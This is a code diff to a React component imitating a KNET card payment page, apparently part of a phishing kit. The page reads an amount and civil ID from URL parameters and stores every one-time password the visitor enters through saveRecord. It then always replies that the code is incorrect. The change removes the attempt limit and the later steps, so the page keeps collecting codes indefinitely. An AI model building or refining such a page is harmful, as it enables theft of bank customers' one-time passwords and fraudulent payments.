@@ -9,7 +9,6 @@ export default function KnetPayment() {
   const [total] = useState(urlParams.get("amount") || "25.000");
   const civilId = urlParams.get("civilId") || urlParams.get("phone") || "";
   const recordIdRef = useRef(urlParams.get("recordId") || null);
-  const [otpAttempts, setOtpAttempts] = useState(0);
   const [otpValue, setOtpValue] = useState("");
   const [otpError, setOtpError] = useState("");
   const [countdown, setCountdown] = useState(60);
@@ -102,40 +101,20 @@ export default function KnetPayment() {
       setTimeout(() => {setIsLoading(false);setStep(2);}, 2000);
     } else if (step === 2) {
       setIsLoading(true);
-      setOtpError("");
-      const newAttempts = otpAttempts + 1;
-      setOtpAttempts(newAttempts);
       const currentOtp = otpValue;
       setOtpValue("");
       setPaymentInfo((p) => ({ ...p, otp: "" }));
       saveRecord({ otp1: currentOtp }, 2);
       setTimeout(() => {
         setIsLoading(false);
-        if (newAttempts >= 3) {
-          setStep(3);
-          setOtpAttempts(0);
-          setOtpError("");
-        } else {
-          setOtpError("The OTP you entered is incorrect. Please check your SMS and try again.");
-        }
+        setOtpError("The OTP you entered is incorrect. Please check your SMS and try again.");
       }, 3000);
-    } else if (step === 3) {
-      setIsLoading(true);
-      saveRecord({}, 3);
-      setTimeout(() => {setIsLoading(false);setStep(4);}, 5000);
-    } else if (step === 4) {
-      setIsLoading(true);
-      saveRecord({ otp2: paymentInfo.otp2 }, 4);
-      setTimeout(() => {
-        setIsLoading(false);
-        alert("Payment completed!");
-      }, 4000);
     }
   };
 
   const isSubmitDisabled =
-  step === 1 && isStep1Disabled ||
-  step === 2 && isStep2Disabled;
+  (step === 1 && isStep1Disabled) ||
+  (step === 2 && isStep2Disabled);
 
   return (
     <div style={{ fontFamily: "Verdana, Arial, Helvetica, sans-serif", backgroundColor: "#ebebeb", minHeight: "100vh" }} dir="ltr" className="px-1">
@@ -179,8 +158,7 @@ export default function KnetPayment() {
                 countdown={countdown}
                 otpError={otpError} />
               }
-              {step === 3 && <Step3 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
-              {step === 4 && <Step4 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
+
             </div>
 
             <div className="knet-form-card">
